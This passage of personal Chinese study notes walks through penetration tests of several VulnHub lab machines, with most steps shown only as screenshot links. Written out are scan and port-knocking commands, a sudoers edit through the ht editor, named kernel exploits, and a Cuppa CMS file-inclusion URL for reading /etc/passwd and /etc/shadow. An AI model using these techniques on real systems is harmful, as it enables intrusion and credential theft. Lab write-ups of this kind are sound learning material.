![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image140.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image141.png)


nmap提权失败

查看内核提权试试

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image142.png)


提权失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image143.png)


使用脏牛提权成功（但是电脑会嘎）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image144.png)


其实nmap可以提权不过我方式有问题

sudo nmap用不了

使用脚本的方式也不行

只能使用绝对路径了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image145.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image146.png)


#### KIOPTRIX: LEVEL 1.2 （CMS框架渗透）

信息收集：使用nmap扫全端口发现又是经典的20和80

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image147.png)


扫服务漏洞也没发现什么

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image148.png)


对网站进行信息收集发现有phpmyadmin，说明可能有sql注入然后登录数据库什么的

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image149.png)


看这个版本有点老试试看有没有版本漏洞

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image150.png)


版本漏洞也没发现什么

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image151.png)


还是扫描子目录试试看有没有好东西

发现登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image152.png)


日志文件发现

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image153.png)


发现目录浏览搜索敏感文件，密码用户什么的

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image154.png)


还是一无所获百度学习[此处搭建的像是一个CMS，使用whatweb进行探测，看此网站具体为什么CMS]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image155.png)


[试试漏洞 uri 设置为 /] set uri /

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image156.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image157.png)


[渗透不成功改一个payload
才行（比赛对于陌生的模块playload就要多改）]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image158.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image159.png)


[查看/etc/passwd看看有没有bash用户如果有说明是要找密码之类的进行ssh登录提权]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image160.png)


但是ssh登录都不行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image161.png)


[内核查看]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image162.png)


[使用wget下载提权文件]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image163.png)


[40616.c内核提权失败]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image164.png)


试试40389.c

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image165.png)


提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image166.png)


[只能看看是否有数据库的密码和用户登录之类的]

[快速查看敏感目录]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image167.png)


[发现mysql的登录密]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image168.png)


[码]

[找半天才发现可疑目录发现有密码爆破出来]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image169.png)


[网站爆破]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image170.png)


[登录用户]

[发现ht sudo提权]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image171.png)


[ht提权用起来比较麻烦]

[但是还是要学]

测试第一个就登录成功，先看下权限，在看看有么有办法提权，如果不行，再尝试第二个账号。

尝试了ping命令suid提权，没有成功\...

测试第二个账号看看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image172.png)


登录成功，发家目录下有两个文件，查看一下，根据文件提示，我们这个账号可能拥有sudo权限

loneferret@Kioptrix3:\~\$ head /etc/sudoers

head: cannot open \`/etc/sudoers\' for reading: Permission denied

尝试查看/etc/sudoers 文件，发现没有权限，根据文件提示，sudo ht

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image173.png)


发现报错，提示

Error opening terminal: xterm-256color.

通过搜索并尝试找到了解决方法：

使用export TERM=xterm-color，解决成功

sudo ht之后打开了这个界面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image174.png)


这是以root权限进入了一个文本编辑器，我们使用它按F3打开/etc/sudoers

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image175.png)


给当前账号加上以root用户执行/bin/bash的权限。

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image176.png)


按F2保存

然后使用sudo /bin/bash

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image177.png)


可以看到我们现在已经拿到了root权限

#### SICKOS: 1.1(网络代理)

信息收集；使用nmap扫发现开了三个端口

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image178.png)


只有3128能访问

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image179.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image180.png)


[分析可能是cms框架漏洞]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image181.png)


[渗透失败]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image182.png)


[看百度说是]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image183.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image184.png)


[要设置代理才能正常访问网页]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image185.png)


[就连nikto也要代理扫]

[描]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image186.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image187.png)


[设置hosts应该才可以访问]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image188.png)


[只能百度后台登录界面了]

[扫不出]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image189.png)


[使用弱密码登录成功]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image190.png)


[发现上传点]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image191.png)


上传成功反弹

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image192.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image193.png)


[后渗透提权]

[发现有wget可以上传提权文件]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image194.png)


[查看bash用户发现真有]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image195.png)


[搜索config.php文件有几率就是那个数据库的用户密码]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image196.png)


[不知道为什么使用root数据库密码登录成功了这个bash用户]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image197.png)


[sudo su提权成功]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image198.png)


#### SICKOS: 1.2

信息收集：使用nmap查看开放22，和80又是挑战我web的时候

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image199.png)


扫服务感觉这个有问题可能有版本漏洞之类的

似乎并没有漏洞

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image200.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image201.png)


先nikto试试水并没有发现什么

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image202.png)


发现有给test目录可疑可能是什么协议可以任意上传之类的

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image203.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image204.png)


使用nmap扫test协议

nmap \--script http-methods \--script-args
http-methods.url-path=\'/test\' 111.111.111.129

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image205.png)


果然有PUT,使用burp抓包上传文件

一次成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image206.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image207.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image208.png)


渗透提权

发现bash用户说明需要找到密码之类的登录提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image209.png)


#### RAVEN: 1（python的sudo提权）

靶机有4个flag

信息收集：使用nmap扫描全端口发现有高端口40876

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image210.png)


不是后门

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image211.png)


又发现wordpress

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image212.png)


应该要改hosts果然可以看了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image213.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image214.png)


wpscan发现用户

wpscan \--url <http://raven.local/> -e u

发现两个用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image215.png)


使用cewl生产密码爆破失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image216.png)


只能再试试kali自带的密码本了

使用老burp扫目录搜索flag

发现server.html

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image217.png)


得到flag1

爆破ssh，没想到这是爆破ssh不是爆破后台，要灵活运用才行啊，

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image218.png)


爆破wordpress后台不超过就只能爆破ssh了

查看bash用户发现只有自己

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image219.png)


说明就是现在用户提权

上传40616.c

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image220.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image221.png)


脏牛提权失败试试其他的方法

百度说是要看清楚用户发现有一个sh用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image222.png)


然后数据库好像还没登录过说不定有flag搜索config看看密码登录看看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image223.png)


登录数据库成功寻找flag或者密码

查看wordpress目录看看是否有密码好登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image224.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image225.png)


爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image226.png)


网站没什么东西哎，直接su切换用户

发现python文件sudo提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image227.png)


python 提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image228.png)


#### LordOfTheRoot_1.0.1 （端口碰撞,cc编译overlayfs提权）

信息搜集：使用nmap扫只有一个22端口

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image229.png)


连接提示容易的1，2，3

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image230.png)


没头绪百度说是端口碰撞，就像敲门如果敲门的频率不对就不让进，不开门（这个提示是敲1，2，3所以就使用hping3敲门）

端口碰撞是一种通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法。一旦收到正确的连接请求序列，防火墙规则就会被动态修改，以允许发送连接请求的主机通过特定端口进行连接。

端口碰撞的主要目的是防止攻击者通过进行端口扫描来扫描系统中潜在的可利用服务，因为除非攻击者发送正确的碰撞序列，否则受保护的端口将显示为关闭。

hping -S 111.111.111.134 -c 1 -p 1

hping -S 111.111.111.134 -c 1 -p 2

hping -S 111.111.111.134 -c 1 -p 3

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image231.png)


门开了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image232.png)


是个网页

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image233.png)


发现有bash64

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image234.png)


解密

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image235.png)


再解密

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image236.png)


发现登录页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image237.png)


扫后台发现并没有其他文件，估测是mysql数据库注入然后活动里面的用户密码然后进行提权

果然是sql注入

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image238.png)


sql爆破半天直接去看博主的密码然后开始爆破ssh成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image239.png)


登录提权

并没有其他用户说明就是这个用户提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image240.png)


使用脏牛提权好像不行

看看内核提权

使用这个37292.c

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image241.png)


内核提权失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image242.png)


只能试试overlayfs漏洞

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image243.png)


提权成功（用cc编译也是离谱）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image244.png)


#### RAVEN: 2(cve-2016-10033 UDF提权)

信息收集：使用nmap分析发现开了个高端口肯定也没啥用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image245.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image246.png)


使用nikto分析80端口发现版本号

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image247.png)


又是wordpress

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image248.png)


又要设置hosts

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image249.png)


出了用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image250.png)


吸取上次犯错经验现在就ssh和网站一起跑

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image251.png)


信息收集

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image252.png)


发现flag

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image253.png)


发现版本号

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image254.png)


可疑漏洞名字好像正好符合5.2.16

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image255.png)


使用msfconsole

设置targeturi为/contact.php不然不会成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image256.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image257.png)


反弹成功开始后渗透

找数据库密码文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image258.png)


发现数据库密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image259.png)


登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image260.png)


发现密码，接着爆破hash密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image261.png)


百度是udf提权

搜索文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image262.png)


按照步骤使用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image263.png)


此处失败多次

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image264.png)


成功（可能是因为要把那个1518.so的权限提上来才可以成功）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image265.png)


提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image266.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image267.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image268.png)


#### LIN.SECURITY: 1(nfs写私钥，nmap提权)

靶机给了给bob用户和密码[secret进去看全是sudo提权可能是练习sudo提权的好靶机]

信息收集：nmap扫描服务

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image269.png)


都不是后面端口

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image270.png)


就应该就nfs可以渗透了，试试看能不能直接使用共享目录看看有没有好东西

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image271.png)


使用mount 连接

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image272.png)


可惜不是根目录，看起来有点像可以上传私钥然后ssh登录的感觉

先生成.ssh目录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image273.png)


生成不了

看这些目录的权限好像是要用户为1001，用户组为1005的用户才能完全使用这个目录就可以创建.ssh

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image274.png)


创建一个perter用户然后再/etc/passwd里面修改UID和GID

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image275.png)


再切换用户创建.ssh文件夹成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image276.png)


然后生成并且上传公钥文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image277.png)


成功登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image278.png)


使用sudo -l发现一个没做过的sudo提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image279.png)


只能百度了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image280.png)


提权成功，

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image281.png)


#### Sputnik: 1(git泄露，splunk渗透反弹，ed提权)

信息收集：使用nmap扫描发现这个用了splunk

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image282.png)


访问55555端口

发现有个网页上面挂了个游戏而且不能抓包

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image283.png)


使用nikto发现有备份文件下载

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image284.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image285.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image286.png)


发现61337是splunk页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image287.png)


试试弱密码不行

扫后台，搜寻用户和密码本或找splunk的版本号看看能不能直接日进去，可能那个游戏页面有密码之类的提示

扫8089的https后台

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image288.png)


发现版本号

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image289.png)


并没有漏洞z

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image290.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image291.png)


百度说是Git泄露

使用git log -p

查看日志

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image292.png)


一直回车看下面发现有密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image293.png)


这个靶机没有22端口要么是端口敲门要么就是直接反弹shell提权，这个靶机太靠互联网下载攻击软件了就不日了

#### w1r3s:（cuppa CMS加curl）

信息搜集

发现用户名是Jan，还有一个数据库的端口，估计应该是要去网页找密码爆破之类的

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image294.png)


再先看看ftp吧

把ftp里面的目录文件全下载下来查看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image295.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image296.png)


发现有几个好东西

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image297.png)


base64解密是

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image298.png)


发现员工名单

The W1R3S.inc employee list

Naomi.W - Manager

Hector.A - IT Dept

Joseph.G - Web Design

Albert.O - Web Design

Gina.L - Inventory

Rico.D - Human Resources

一直访问wordpress，跳转到localhost修改hosts让他跳回去

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image299.png)


终于找到登录页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image300.png)


登录网页发现 cuppa cms

的应该网站初始化的样子，前提是输入对用户名和数据库的密码之类的说明要去找sql密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image301.png)


使用whatweb查看框架然后用查看有什么脚本可以利用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image302.png)


发现了东西，可能就是那个初始化页面的漏洞套进去看看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image303.png)


可惜这个套不了，可能是故意设置的所以我们使用什么的文件包含试试

http://target/cuppa/alerts/alertConfigField.php?urlConfig

http://172.16.123.110/administrator/alerts/alertConfigField.php?urlConfig

使用还是不成功，可能是url编码问题使用curl测试一下

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image304.png)


成功包含/etc/passwd

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image305.png)


读取到shadow

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image306.png)


开始可以开始爆破了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image307.png)


爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image308.png)


ssh登录提权：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image309.png)


